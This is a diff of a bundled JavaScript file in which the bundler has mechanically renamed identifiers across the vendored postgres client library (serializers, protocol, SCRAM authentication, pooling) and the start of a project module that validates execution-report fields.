-var number, bool, json3, string, literal3, arrays, types, dates, shaped, shapedTypes, identity2, Parameter, timestamp3, toCamel, toPascal, toKebab, fromCamel, fromPascal, fromKebab, camel, pascal, kebab;
+var number2, bool, json3, string2, literal3, arrays, types, dates, shaped, shapedTypes, identity2, Parameter, timestamp3, toCamel, toPascal, toKebab, fromCamel, fromPascal, fromKebab, camel, pascal, kebab;
 var init_types = __esm({
   "node_modules/postgres/src/types.js"() {
     init_errors();
-    number = (x) => +x;
+    number2 = (x) => +x;
     bool = (x) => x === "t";
     json3 = (x) => JSON.parse(x);
-    string = (x) => x instanceof Date ? serializeDate(x) : Array.isArray(x) ? serializeArray(x, string) : literal3(x) ? JSON.stringify(x) : "" + x;
+    string2 = (x) => x instanceof Date ? serializeDate(x) : Array.isArray(x) ? serializeArray(x, string2) : literal3(x) ? JSON.stringify(x) : "" + x;
     literal3 = (x) => x !== null && typeof x === "object" && (Object.getPrototypeOf(x) === Object.prototype || Object.getPrototypeOf(x) === null);
     arrays = {
       16: 1e3,
@@ -8410,15 +8410,15 @@ var init_types = __esm({
       5069: 271
     };
     types = {
-      string: { to: 25, from: null, serialize: string },
-      number: { to: 0, from: [21, 23, 26, 700, 701], serialize: string, parse: number },
+      string: { to: 25, from: null, serialize: string2 },
+      number: { to: 0, from: [21, 23, 26, 700, 701], serialize: string2, parse: number2 },
       json: { to: 114, from: [114, 3802], serialize: (x) => JSON.stringify(x), parse: json3 },
       boolean: { to: 16, from: [16], serialize: (x) => x === true ? "t" : "f", parse: bool },
       date: { to: 1184, from: [1082, 1114, 1184], serialize: serializeDate, parse: null },
       bytea: { to: 17, from: [17], serialize: (x) => "\\x" + Buffer.from(x).toString("hex"), parse: (x) => Buffer.from(x.slice(2), "hex") }
     };
     dates = { 1082: parseDate, 1114: parseTimestamp, 1184: parseTimestamptz };
-    shaped = (is, serialize) => (x) => is(x) ? serialize(x) : string(x);
+    shaped = (is, serialize) => (x) => is(x) ? serialize(x) : string2(x);
     shapedTypes = {
       ...types,
       boolean: { ...types.boolean, serialize: shaped((x) => typeof x === "boolean", types.boolean.serialize) },
@@ -8471,17 +8471,17 @@ var init_types = __esm({
 // node_modules/postgres/src/build.js
 function build(query2, options) {
   const values2 = [], oids = [], o = { transform: options.transform, infer: options.infer !== false, resolve: options.resolve, values: values2, oids, dynamic: !query2.tagged };
-  const text6 = query2.tagged ? stringify3(query2, o) : (query2.args.forEach((x) => value(x, o)), "" + query2.strings[0]);
+  const text7 = query2.tagged ? stringify3(query2, o) : (query2.args.forEach((x) => value(x, o)), "" + query2.strings[0]);
   if (values2.length >= 65534)
     throw Errors.generic("MAX_PARAMETERS_EXCEEDED", "Max number of parameters (65534) exceeded");
   const types2 = oids.join();
-  return { strings: query2.strings, dynamic: o.dynamic, types: types2, text: text6, values: values2, oids };
+  return { strings: query2.strings, dynamic: o.dynamic, types: types2, text: text7, values: values2, oids };
 }
 function stringify3(q, o) {
-  let string3 = q.strings[0];
+  let string4 = q.strings[0];
   for (let i = 1; i < q.strings.length; i++)
-    string3 += part(string3, q.args[i - 1], o, q.strings[i]) + q.strings[i];
-  return string3;
+    string4 += part(string4, q.args[i - 1], o, q.strings[i]) + q.strings[i];
+  return string4;
 }
 function part(before, x, o, after2 = "") {
   if (x instanceof Builder || x instanceof Identifier || isFragment(x) || Array.isArray(x) && isFragment(x[0]))
@@ -8489,14 +8489,14 @@ function part(before, x, o, after2 = "") {
   return isFragment(x) && x.strings === joinStrings ? joined(x.args[0], o, before, after2) : x instanceof Join ? joined(x, o, "", "") : x instanceof Builder ? helper(before, x, o) : isFragment(x) ? fragment2(x, o) : x instanceof Identifier ? x.value : Array.isArray(x) && isFragment(x[0]) ? x.reduce((acc, x2) => acc + " " + fragment2(x2, o), "") : value(x, o);
 }
 function joined(join9, o, before, after2) {
-  let text6 = "";
+  let text7 = "";
   join9.items.forEach((item, i) => {
-    i > 0 && (text6 = spaced(text6, fragment2(join9.separator, o)));
-    text6 = spaced(text6, part("", item, o));
+    i > 0 && (text7 = spaced(text7, fragment2(join9.separator, o)));
+    text7 = spaced(text7, part("", item, o));
   });
-  before && text6 && !/\s$/.test(before) && !/^\s/.test(text6) && (text6 = " " + text6);
-  after2 && text6 && !/^\s/.test(after2) && !/\s$/.test(text6) && (text6 = text6 + " ");
-  return text6;
+  before && text7 && !/\s$/.test(before) && !/^\s/.test(text7) && (text7 = " " + text7);
+  after2 && text7 && !/^\s/.test(after2) && !/\s$/.test(text7) && (text7 = text7 + " ");
+  return text7;
 }
 function spaced(a, b) {
   return a && b && !/\s$/.test(a) && !/^\s/.test(b) ? a + " " + b : a + b;
@@ -8870,16 +8870,16 @@ var init_result = __esm({
 import util from "util";
 function context3(q) {
   const options = q.handler.options || {};
-  let text6 = null;
+  let text7 = null;
   if (q.strings.length) {
     try {
-      text6 = q.text;
+      text7 = q.text;
     } catch (error2) {
-      text6 = null;
+      text7 = null;
     }
   }
   return {
-    query: text6,
+    query: text7,
     parameters: void 0,
     database: options.database,
     user: userName(options),
@@ -8930,7 +8930,7 @@ var init_query = __esm({
     origins = /* @__PURE__ */ new WeakMap();
     CLOSE = {};
     Query = class _Query extends Promise {
-      constructor(strings2, args, handler, options = {}) {
+      constructor(strings3, args, handler, options = {}) {
         let resolve5, reject;
         super((a, b) => {
           resolve5 = a;
@@ -8939,8 +8939,8 @@ var init_query = __esm({
         this.fulfil = resolve5;
         this.fail = reject;
         this[isQuery] = true;
-        this.tagged = Array.isArray(strings2.raw);
-        this.strings = strings2;
+        this.tagged = Array.isArray(strings3.raw);
+        this.strings = strings3;
         this.args = args;
         this.handler = handler;
         this.options = options;
@@ -8953,7 +8953,7 @@ var init_query = __esm({
         this.trace = null;
         this.aborts = null;
         this.originError = handler.debug ? new Error() : null;
-        this.tagged && !handler.debug && !origins.has(strings2) && origins.set(strings2, located());
+        this.tagged && !handler.debug && !origins.has(strings3) && origins.set(strings3, located());
       }
       static get [Symbol.species]() {
         return Promise;
@@ -9237,8 +9237,8 @@ function unbroken(k, x) {
 function sasl(w, mechanism, initial) {
   return w.type(p).str(mechanism).i32(Buffer.byteLength(initial)).bytes(initial).end();
 }
-function parse9(w, name, text6, oids = []) {
-  w.type(P).str(name).str(text6).u16(oids.length);
+function parse9(w, name, text7, oids = []) {
+  w.type(P).str(name).str(text7).u16(oids.length);
   for (let j = 0; j < oids.length; j++)
     w.i32(oids[j] | 0);
   return w.end();
@@ -9454,7 +9454,7 @@ var init_protocol = __esm({
     terminate = (w) => w.type(X).end();
     copyDone = (w) => w.type(c).end();
     sslRequest = (w) => w.untyped().i32(80877103).endUntyped();
-    query = (w, text6) => w.type(Q).str(text6).end();
+    query = (w, text7) => w.type(Q).str(text7).end();
     password = (w, x) => w.type(p).str(x).end();
     saslResponse = (w, x) => w.type(p).bytes(x).end();
     copyData = (w, x) => w.type(d).bytes(x).end();
@@ -9506,7 +9506,7 @@ var init_protocol = __esm({
     text4 = typeof Buffer.prototype.utf8Slice === "function" ? (x, start2, end) => x.utf8Slice(start2, end) : (x, start2, end) => x.toString("utf8", start2, end);
     u32 = (x, i) => (x[i] << 24 | x[i + 1] << 16 | x[i + 2] << 8 | x[i + 3]) >>> 0;
     u16 = (x, i) => x[i] << 8 | x[i + 1];
-    field2 = (name, table2, number2, type) => ({ name, table: table2, number: number2, type });
+    field2 = (name, table2, number3, type) => ({ name, table: table2, number: number3, type });
   }
 });
 
@@ -9580,8 +9580,8 @@ function wrap(socket, host) {
       error3 && !failure && (failure = error3);
       socket.destroy();
     },
-    keepAlive(seconds3) {
-      seconds3 && socket.setKeepAlive && socket.setKeepAlive(true, 1e3 * seconds3);
+    keepAlive(seconds2) {
+      seconds2 && socket.setKeepAlive && socket.setKeepAlive(true, 1e3 * seconds2);
     }
   };
   listen();
@@ -9652,9 +9652,9 @@ var init_socket = __esm({
 });
 
 // node_modules/postgres/src/startup.js
-import crypto from "crypto";
+import crypto2 from "crypto";
 import fs from "fs";
-async function open(options, signal = { aborted: false, sockets: /* @__PURE__ */ new Set() }, first = 0) {
+async function open2(options, signal = { aborted: false, sockets: /* @__PURE__ */ new Set() }, first = 0) {
   const hosts2 = options.path ? [null] : options.host, wanted = options.target_session_attrs, passes = wanted === "prefer-standby" ? ["standby", "any"] : [wanted || "any"];
   let last;
   for (const want of passes) {
@@ -9836,21 +9836,21 @@ function Auth({ user, pass, binding: binding2 = "prefer", socket }) {
       throw Errors.generic("SASL_MECHANISM_NOT_SUPPORTED", "The server offered no supported SASL mechanism");
     header = plus ? "p=tls-server-end-point,," : hash4 ? "y,," : "n,,";
     bound = plus ? hash4 : false;
-    nonce = crypto.randomBytes(18).toString("base64");
+    nonce = crypto2.randomBytes(18).toString("base64");
     verified = false;
     return SASL(plus ? "SCRAM-SHA-256-PLUS" : "SCRAM-SHA-256", header + "n=*,r=" + nonce);
   }
   function proceed(x, pass2) {
-    const res = x.toString("utf8", 9).split(",").reduce((acc, x2) => (acc[x2[0]] = x2.slice(2), acc), {}), key2 = sha256(pass2 + "\0" + res.s + "\0" + res.i).toString("base64");
+    const res = x.toString("utf8", 9).split(",").reduce((acc, x2) => (acc[x2[0]] = x2.slice(2), acc), {}), key2 = sha2562(pass2 + "\0" + res.s + "\0" + res.i).toString("base64");
     if (!res.r.startsWith(nonce))
       throw Errors.generic("SASL_NONCE_MISMATCH", "The server nonce does not start with the client nonce");
     if (!salted.has(key2)) {
       salted.size >= 64 && salted.delete(salted.keys().next().value);
-      salted.set(key2, crypto.pbkdf2Sync(pass2, Buffer.from(res.s, "base64"), +res.i, 32, "sha256"));
+      salted.set(key2, crypto2.pbkdf2Sync(pass2, Buffer.from(res.s, "base64"), +res.i, 32, "sha256"));
     }
     const saltedPassword = salted.get(key2), clientKey = hmac(saltedPassword, "Client Key"), channel = (bound ? Buffer.concat([Buffer.from(header), bound]) : Buffer.from(header)).toString("base64"), auth = "n=*,r=" + nonce + ",r=" + res.r + ",s=" + res.s + ",i=" + res.i + ",c=" + channel + ",r=" + res.r;
     signature2 = hmac(hmac(saltedPassword, "Server Key"), auth).toString("base64");
-    return SASLResponse("c=" + channel + ",r=" + res.r + ",p=" + xor(clientKey, hmac(sha256(clientKey), auth)).toString("base64"));
+    return SASLResponse("c=" + channel + ",r=" + res.r + ",p=" + xor(clientKey, hmac(sha2562(clientKey), auth)).toString("base64"));
   }
   function finish2(x) {
     if (!signature2 || x.toString("utf8", 9).split("\0", 1)[0].slice(2) !== signature2)
@@ -9879,7 +9879,7 @@ function unbound(reason) {
 function endpoint(certificate) {
   try {
     const x = Buffer.from(certificate), algorithm = signature(x);
-    return algorithm ? crypto.createHash(algorithm).update(x).digest() : null;
+    return algorithm ? crypto2.createHash(algorithm).update(x).digest() : null;
   } catch (_) {
     return null;
   }
@@ -9910,13 +9910,13 @@ function der(x, start2) {
   return { start: start2, body, end: body + length };
 }
 function md5(x) {
-  return crypto.createHash("md5").update(x).digest("hex");
+  return crypto2.createHash("md5").update(x).digest("hex");
 }
 function hmac(key2, x) {
-  return crypto.createHmac("sha256", key2).update(x).digest();
+  return crypto2.createHmac("sha256", key2).update(x).digest();
 }
-function sha256(x) {
-  return crypto.createHash("sha256").update(x).digest();
+function sha2562(x) {
+  return crypto2.createHash("sha256").update(x).digest();
 }
 function xor(a, b) {
   const x = Buffer.allocUnsafe(a.length);
@@ -9927,17 +9927,17 @@ function xor(a, b) {
 function pgpass(file, host, port, database, user) {
   if (!file)
     return null;
-  let text6;
+  let text7;
   try {
     const stat7 = fs.statSync(file);
     if (!stat7.isFile() || process.platform !== "win32" && stat7.mode & 63)
       return null;
-    text6 = fs.readFileSync(file, "utf8");
+    text7 = fs.readFileSync(file, "utf8");
   } catch (_) {
     return null;
   }
   const wanted = [host, String(port), database, user];
-  for (const line of text6.split(/\r?\n/)) {
+  for (const line of text7.split(/\r?\n/)) {
     const fields = line && line[0] !== "#" ? split(line) : [];
     if (fields.length === 5 && wanted.every((x, i) => fields[i] === "*" || fields[i] === x))
       return fields[4];
@@ -10004,7 +10004,7 @@ var init_startup = __esm({
 // node_modules/postgres/src/connection.js
 import Stream from "stream";
 function Connection(ready, options, events) {
-  const { socket } = ready, timers = options.timers, defer = timers.nextTick || process.nextTick, { transform } = options, sent = [], pending = [], running = /* @__PURE__ */ new Set(), open3 = /* @__PURE__ */ new Set(), prepared = /* @__PURE__ */ new Map(), out = Writer(), frames = Frames(frame, socket.shared, (error2) => (connection2.fatal = error2, socket.destroy()));
+  const { socket } = ready, timers = options.timers, defer = timers.nextTick || process.nextTick, { transform } = options, sent = [], pending = [], running = /* @__PURE__ */ new Set(), open4 = /* @__PURE__ */ new Set(), prepared = /* @__PURE__ */ new Map(), out = Writer(), frames = Frames(frame, socket.shared, (error2) => (connection2.fatal = error2, socket.destroy()));
   let blocker = null, rolling = false, fence = null, drained = null, status = ready.status, flushing = false, closed = null, closing = null, portals = 0, traced3 = 0, epoch2 = 0, headSince = 0, notables = 0;
   const connection2 = {
     id: ids++,
@@ -10088,7 +10088,7 @@ function Connection(ready, options, events) {
     x.query && (x.query.state = connection2.backend);
     if (fence)
       pending.splice(pending.indexOf(fence), 0, x);
-    else if (x.ends && open3.size)
+    else if (x.ends && open4.size)
       pending.push(fence = x);
     else if (blocker || pending.length)
       pending.push(x);
@@ -10131,7 +10131,7 @@ function Connection(ready, options, events) {
       sync2(x, true);
     }
     x.fresh && register(x.fresh);
-    x.portal && x.kind === "query" && open3.add(x);
+    x.portal && x.kind === "query" && open4.add(x);
     x.query && (x.query.active = sent.length === 0);
     x.ends && epoch2++;
     x.epoch = epoch2;
@@ -10252,8 +10252,8 @@ function Connection(ready, options, events) {
     x.values = serialize(built.oids, built, x.fresh || {});
     run4(x, name);
   }
-  function parse12(x, name, text6, oids) {
-    parse9(out, name, text6, oids);
+  function parse12(x, name, text7, oids) {
+    parse9(out, name, text7, oids);
     x.parses.push(name);
   }
   function run4(x, name) {
@@ -10411,7 +10411,7 @@ function Connection(ready, options, events) {
     pending.splice(0).forEach((x) => x.own ? settle(x) : settleError(x, closed));
     running.forEach((query2) => query2.settled || query2.reject(decorate(query2, closed)));
     running.clear();
-    open3.clear();
+    open4.clear();
     connection2.onended && connection2.onended();
     events.onclose(connection2, closed);
   }
@@ -10421,8 +10421,8 @@ function Connection(ready, options, events) {
   function settleError(x, error2) {
     x.kind === "describe" ? x.reject(error2) : x.query && !x.query.settled && x.query.reject(decorate(x.query, error2));
   }
-  function debug(text6, values2, oids) {
-    typeof options.debug === "function" && options.debug(connection2.id, text6, values2, oids);
+  function debug(text7, values2, oids) {
+    typeof options.debug === "function" && options.debug(connection2.id, text7, values2, oids);
   }
   function wrote(x) {
     const trace = x.trace;
@@ -10493,14 +10493,14 @@ function Connection(ready, options, events) {
     }
     x.describing && described(x);
   }
-  function column2(name, table2, number2, type) {
+  function column2(name, table2, number3, type) {
     const parser = events.parser(type);
     return {
       name: transform.column.from ? transform.column.from(name) : name,
       parser: parser.identity ? null : parser,
       decode: events.decoder(type, parser),
       table: table2,
-      number: number2,
+      number: number3,
       type
     };
   }
@@ -10628,7 +10628,7 @@ function Connection(ready, options, events) {
     x.last ? x.last.then(() => query2.settled || finish2(x), (error2) => query2.settled || query2.reject(decorate(query2, error2))) : query2.settled || finish2(x);
   }
   function unfence(cursor) {
-    if (!open3.delete(cursor) || open3.size || !fence)
+    if (!open4.delete(cursor) || open4.size || !fence)
       return;
     fence = null;
     release2();
@@ -10907,20 +10907,20 @@ function Rows(columns2) {
   }
   return state;
 }
-function read(state, array, text6, from) {
-  const key2 = array ? "array" : "object";
+function read(state, array2, text7, from) {
+  const key2 = array2 ? "array" : "object";
   if (state[key2] !== null)
     return state[key2];
   if (!state.compilable || ++state.seen < after)
     return null;
   try {
-    return state[key2] = compile(state.columns, array, text6, from);
+    return state[key2] = compile(state.columns, array2, text7, from);
   } catch (_) {
     compiles = state.compilable = false;
     return null;
   }
 }
-function compile(columns2, array, text6, from) {
+function compile(columns2, array2, text7, from) {
   const locals = [], body = ["let l = 0"], at = "x, i, i + l";
   columns2.forEach((c2, j) => {
     c2.decode ? locals.push("d" + j + " = c[" + j + "].decode") : c2.parser && locals.push("p" + j + " = c[" + j + "].parser");
@@ -10934,14 +10934,14 @@ function compile(columns2, array, text6, from) {
     );
   });
   body.push(
-    array ? "return [" + columns2.map((c2, j) => "v" + j).join(",") + "]" : "return {" + columns2.map((c2, j) => key(c2.name) + ":v" + j).join(",") + "}"
+    array2 ? "return [" + columns2.map((c2, j) => "v" + j).join(",") + "]" : "return {" + columns2.map((c2, j) => key(c2.name) + ":v" + j).join(",") + "}"
   );
   return new Function(
     "c",
     "text",
     "from",
     (locals.length ? "const " + locals.join(", ") + "\n" : "") + "return function row(x, i) {\n" + body.filter(Boolean).join("\n") + "\n}"
-  )(columns2, text6, from);
+  )(columns2, text7, from);
 }
 var slow, notable, text5, noop3, ending, limit, refused, skip, unknown2, states, after, ids, compiles;
 var init_connection = __esm({
@@ -11111,23 +11111,23 @@ function Pool(options, types2) {
   }
   function pick(job) {
     const statement2 = job.statement, any = !statement2 || !statement2.name;
-    let best2 = null;
+    let best = null;
     for (const c2 of connections) {
       const free = usable(c2);
       if (free && c2.inflight === 0) {
         if (any || c2.prepared.has(statement2.name))
           return c2;
-        best2 = best2 && best2.inflight === 0 ? best2 : c2;
-      } else if (free && !job.lease && !job.exclusive && c2.inflight < options.max_pipeline && (!best2 || c2.inflight < best2.inflight)) {
-        best2 = c2;
+        best = best && best.inflight === 0 ? best : c2;
+      } else if (free && !job.lease && !job.exclusive && c2.inflight < options.max_pipeline && (!best || c2.inflight < best.inflight)) {
+        best = c2;
       }
     }
-    if (best2 && best2.inflight === 0)
-      return best2;
+    if (best && best.inflight === 0)
+      return best;
     if (connections.size + opening < options.max && !failingSince)
       return null;
-    best2 && options.scheduler && job.q && needed(job) && (best2 = scheduled(job) || best2);
-    return best2 && opening && best2.inflight >= Math.ceil(waiting.length / (opening + 1)) ? null : best2;
+    best && options.scheduler && job.q && needed(job) && (best = scheduled(job) || best);
+    return best && opening && best.inflight >= Math.ceil(waiting.length / (opening + 1)) ? null : best;
   }
   function needed(job) {
     if (!job.q.cost || job.q.cost.est === void 0 || job.q.cost.est >= notable)
@@ -11150,15 +11150,15 @@ function Pool(options, types2) {
     return heavy < connections.size - reserve ? soonest(t, Infinity, false) : soonest(t, 2 * e, true) || soonest(t, Infinity, false);
   }
   function soonest(t, most, heavy) {
-    let best2 = null, value2 = Infinity, ties = 0;
+    let best = null, value2 = Infinity, ties = 0;
     for (const c2 of connections) {
       const v = usable(c2) && c2.inflight < options.max_pipeline && (!heavy || c2.heavy()) ? c2.backlog(t) : Infinity;
       if (v <= most && v < value2)
-        best2 = c2, value2 = v, ties = 1;
+        best = c2, value2 = v, ties = 1;
       else if (v <= most && v === value2 && v !== Infinity && Math.random() * ++ties < 1)
-        best2 = c2;
+        best = c2;
     }
-    return best2;
+    return best;
   }
   function ontimed(sample, t) {
     decay(t);
@@ -11192,7 +11192,7 @@ function Pool(options, types2) {
   function connect2() {
     opening++;
     retryTimer && (clearTimeout2(retryTimer), retryTimer = null);
-    (options.open || open)(options, signal, replacing.length ? replacing.shift() : 0).then(opened, failed);
+    (options.open || open2)(options, signal, replacing.length ? replacing.shift() : 0).then(opened, failed);
   }
   function copy(error2) {
     if (!error2 || typeof error2 !== "object")
@@ -11244,12 +11244,12 @@ function Pool(options, types2) {
     hold(c2);
     typesLoading = true;
     c2.loading = true;
-    types2.load((text6) => new Promise((resolve5, reject2) => {
-      const q = new Query([text6], [], Object.assign(() => {
+    types2.load((text7) => new Promise((resolve5, reject2) => {
+      const q = new Query([text7], [], Object.assign(() => {
       }, { options }), { simple: true });
       q.executed = true;
       q.then(resolve5, reject2);
-      c2.simple(q, text6);
+      c2.simple(q, text7);
     })).then(
       () => typesLoaded = true,
       (error2) => error2 instanceof PostgresError ? typesLoaded = true : error2 && error2.code === "TYPE_NOT_FOUND" && (typesError = error2, typesFailed = now2())
@@ -11504,25 +11504,25 @@ function Queue() {
 function alone(x) {
   return x.alone === void 0 ? x.alone = opens(x.text) : x.alone;
 }
-function opens(text6) {
-  if (begins.test(text6))
+function opens(text7) {
+  if (begins.test(text7))
     return true;
   starts.lastIndex = 0;
   let match2;
-  while (match2 = starts.exec(text6)) {
+  while (match2 = starts.exec(text7)) {
     const from = match2.index + 5;
     let i = from;
     while (true) {
-      while (i < text6.length && /\s/.test(text6[i]))
+      while (i < text7.length && /\s/.test(text7[i]))
         i++;
-      if (text6[i] !== "/" || text6[i + 1] !== "*")
+      if (text7[i] !== "/" || text7[i + 1] !== "*")
         break;
-      const end = text6.indexOf("*/", i + 2);
+      const end = text7.indexOf("*/", i + 2);
       if (end === -1)
         return false;
       i = end + 2;
     }
-    if (i > from && transaction.test(text6.slice(i, i + 12)))
+    if (i > from && transaction.test(text7.slice(i, i + 12)))
       return true;
     starts.lastIndex = Math.max(starts.lastIndex, i);
   }
@@ -11533,11 +11533,11 @@ function Statements(scheduler) {
   let counter = 1, clock = 0;
   const texts = /* @__PURE__ */ new Map();
   return { get, clear, known: known2 };
-  function known2(text6) {
-    let x = texts.get(text6);
+  function known2(text7) {
+    let x = texts.get(text7);
     if (x)
       return x;
-    texts.set(text6, x = { text: text6, est: void 0, alone: void 0 });
+    texts.set(text7, x = { text: text7, est: void 0, alone: void 0 });
     texts.size > limit2 && texts.delete(texts.keys().next().value);
     return x;
   }
@@ -11553,25 +11553,25 @@ function Statements(scheduler) {
     tagged && tagged.set(built.types, statement2);
     return statement2;
   }
-  function unnamed(text6) {
+  function unnamed(text7) {
     return {
       key: null,
       live: false,
       name: "",
-      text: text6,
+      text: text7,
       ends: void 0,
       shape: void 0,
       version: 0,
       used: 0,
-      cost: scheduler ? known2(text6) : null
+      cost: scheduler ? known2(text7) : null
     };
   }
-  function add(key2, text6) {
+  function add(key2, text7) {
     const statement2 = {
       key: key2,
       live: true,
       name: prefix + counter++,
-      text: text6,
+      text: text7,
       ends: void 0,
       shape: void 0,
       version: 0,
@@ -11590,9 +11590,9 @@ function Statements(scheduler) {
     oldest.live = false;
     map.delete(oldest.key);
   }
-  function set(strings2) {
+  function set(strings3) {
     const x = /* @__PURE__ */ new Map();
-    templates.set(strings2, x);
+    templates.set(strings3, x);
     return x;
   }
   function clear() {
@@ -12044,17 +12044,17 @@ function Postgres(a, b) {
       typed,
       unsafe,
       notify,
-      array,
+      array: array2,
       json: json4,
       file
     });
     return sql2;
-    function sql2(strings2, ...args) {
-      return strings2 && Array.isArray(strings2.raw) ? new Query(strings2, args, handler2) : typeof strings2 === "string" && !args.length ? new Identifier(options.transform.column.to ? options.transform.column.to(strings2) : strings2) : new Builder(strings2, args);
+    function sql2(strings3, ...args) {
+      return strings3 && Array.isArray(strings3.raw) ? new Query(strings3, args, handler2) : typeof strings3 === "string" && !args.length ? new Identifier(options.transform.column.to ? options.transform.column.to(strings3) : strings3) : new Builder(strings3, args);
     }
-    function unsafe(string3, args = [], options2 = {}) {
+    function unsafe(string4, args = [], options2 = {}) {
       arguments.length === 2 && !Array.isArray(args) && (options2 = args, args = []);
-      return new Query([string3], args, handler2, {
+      return new Query([string4], args, handler2, {
         prepare: false,
         ...options2,
         simple: "simple" in options2 ? options2.simple : args.length === 0
@@ -12065,10 +12065,10 @@ function Postgres(a, b) {
     }
     function file(path, args = [], options2 = {}) {
       arguments.length === 2 && !Array.isArray(args) && (options2 = args, args = []);
-      const fileHandler = (query2) => fs2.readFile(path, "utf8", (err, string3) => {
+      const fileHandler = (query2) => fs2.readFile(path, "utf8", (err, string4) => {
         if (err)
           return query2.reject(err);
-        query2.strings = [string3];
+        query2.strings = [string4];
         handler2(query2);
       });
       Object.assign(fileHandler, handler2);
@@ -12081,7 +12081,7 @@ function Postgres(a, b) {
   function json4(x) {
     return new Parameter(x, 3802);
   }
-  function array() {
+  function array2() {
     throw Errors.generic("ARRAY_REMOVED", "sql.array() is removed in v4, pass the array as it is");
   }
   async function reserve() {
@@ -12143,14 +12143,14 @@ function Postgres(a, b) {
       }, { cancel: pool.cancel }));
       scoped.savepoint = savepoint;
       scoped.begin = nested;
-      scoped.rollback = () => rolled || (rolled = control(lease, name ? "rollback to " + identifier(name) : "rollback").then(() => {
+      scoped.rollback = () => rolled || (rolled = control(lease, name ? "rollback to " + identifier2(name) : "rollback").then(() => {
       }));
       scoped.prepare = (x) => {
         if (inside)
           throw Errors.generic("NESTED_TRANSACTION_MODE", "A nested transaction can not be prepared, only the outermost one");
         prepare = x.replace(/[^a-z0-9$\-_. ]/gi, "");
       };
-      name && await control(lease, "savepoint " + identifier(name));
+      name && await control(lease, "savepoint " + identifier2(name));
       try {
         result = await new Promise((resolve5, reject) => {
           const x = fn2(scoped);
@@ -12161,7 +12161,7 @@ function Postgres(a, b) {
       } catch (error2) {
         context4 && !name && (context4.outcome = "rollback");
         stopped() ? rolled && await rolled.catch(() => {
-        }) : lease.connection.closed || await control(lease, name ? "rollback to " + identifier(name) : "rollback");
+        }) : lease.connection.closed || await control(lease, name ? "rollback to " + identifier2(name) : "rollback");
         throw error2 instanceof PostgresError && error2.code === "25P02" && uncaught || error2;
       }
       if (stopped()) {
@@ -12198,11 +12198,11 @@ function Postgres(a, b) {
   function normal(x) {
     return (x || "").toLowerCase().replace(/[^a-z ]/g, "").replace(/\s+/g, " ").trim();
   }
-  function identifier(x) {
+  function identifier2(x) {
     return '"' + x.replace(/"/g, '""') + '"';
   }
-  function control(lease, text6) {
-    const q = new Query([text6], [], Object.assign((q2) => lease.send(q2), { options, cancel: pool.cancel }), { simple: true });
+  function control(lease, text7) {
+    const q = new Query([text7], [], Object.assign((q2) => lease.send(q2), { options, cancel: pool.cancel }), { simple: true });
     return q.execute();
   }
   async function end(options2) {
@@ -12555,20 +12555,20 @@ var init_maintenance = __esm({
 });
 
 // src/knowledge/execution.ts
-function object(value2) {
+function object2(value2) {
   if (!value2 || typeof value2 !== "object" || Array.isArray(value2)) throw new Error("Execution evidence must be an object");
   return value2;
 }
-function string2(value2, pattern, field3) {
+function string3(value2, pattern, field3) {
   if (typeof value2 !== "string" || [...value2].some((char) => char.charCodeAt(0) < 32 || char.charCodeAt(0) === 127) || !pattern.test(value2)) throw new Error(`Execution ${field3} is invalid`);
   return value2;
 }
-function integer2(value2, field3, minimum = 1) {
+function integer4(value2, field3, minimum = 1) {
   if (!Number.isSafeInteger(value2) || Number(value2) < minimum) throw new Error(`Execution ${field3} must be a safe integer >= ${minimum}`);
   return Number(value2);
 }
-function time2(value2) {
-  const result = string2(value2, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/, "timestamp");
+function time3(value2) {
+  const result = string3(value2, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/, "timestamp");
   if (!Number.isFinite(Date.parse(result)) || new Date(result).toISOString() !== result) throw new Error("Execution timestamp is invalid");
   return result;
 }
@@ -12577,7 +12577,7 @@ function enumeration(value2, allowed2, field3) {
   return value2;
 }
 function executionProjectPath(value2) {
-  const path = string2(value2, /^(?:\.|[^\\:]{1,1024})$/, "project path");
+  const path = string3(value2, /^(?:\.|[^\\:]{1,1024})$/, "project path");
   if (path !== "." && path.split("/").some((part2) => !part2 || part2 === "." || part2 === "..")) {
     throw new Error("Execution project path must be a canonical repository-relative directory");
   }
@@ -12586,10 +12586,10 @@ function executionProjectPath(value2) {
 function executionTools(value2) {
   if (!Array.isArray(value2) || value2.length > 32) throw new Error("Execution tools must be a bounded list");
   const result = value2.map((entry2) => {
-    const item = object(entry2);
+    const item = object2(entry2);
     return {
       name: enumeration(item.name, tools, "tool"),
-      version: string2(item.version, /^v?\d+(?:\.\d+){1,3}(?:[-+][A-Za-z0-9.-]{1,60})?$/, "installed tool version"),
+      version: string3(item.version, /^v?\d+(?:\.\d+){1,3}(?:[-+][A-Za-z0-9.-]{1,60})?$/, "installed tool version"),
       basis: enumeration(item.basis, ["recorder-runtime", "workflow-report"], "tool basis")
     };
   });
@@ -12600,42 +12600,42 @@ function executionTools(value2) {
 function executionCaches(value2) {
   if (!Array.isArray(value2) || value2.length > 16) throw new Error("Execution caches must be a bounded list");
   const result = value2.map((entry2) => {
-    const item = object(entry2);
+    const item = object2(entry2);
     return { tool: enumeration(item.tool, caches, "cache tool"), result: enumeration(item.result, states2, "cache result"), basis: "workflow-report" };
   });
   if (new Set(result.map(({ tool: tool2 }) => tool2)).size !== result.length) throw new Error("Execution cache tools must be unique");
   return result.sort((a, b) => a.tool.localeCompare(b.tool));
 }
 function parseExecutionReport(value2) {
-  const input2 = object(value2);
+  const input2 = object2(value2);
   if (input2.version !== 1 || input2.coverage !== "single-command") throw new Error("Execution report version/coverage is unsupported");
-  const scope2 = object(input2.repository);
+  const scope2 = object2(input2.repository);
   const repository = {
-    host: string2(scope2.host, /^https:\/\/.{1,253}$/, "host"),
-    repositoryId: string2(scope2.repositoryId, /^[1-9]\d{0,19}$/, "repository ID")
+    host: string3(scope2.host, /^https:\/\/.{1,253}$/, "host"),
+    repositoryId: string3(scope2.repositoryId, /^[1-9]\d{0,19}$/, "repository ID")
   };
   validateScope(repository);
-  const headSha = string2(input2.headSha, /^[a-f0-9]{40}(?:[a-f0-9]{24})?$/, "run revision");
-  const checkoutSha = string2(input2.checkoutSha, /^[a-f0-9]{40}(?:[a-f0-9]{24})?$/, "checkout revision");
-  const startedAt = time2(input2.startedAt);
-  const completedAt = time2(input2.completedAt);
+  const headSha = string3(input2.headSha, /^[a-f0-9]{40}(?:[a-f0-9]{24})?$/, "run revision");
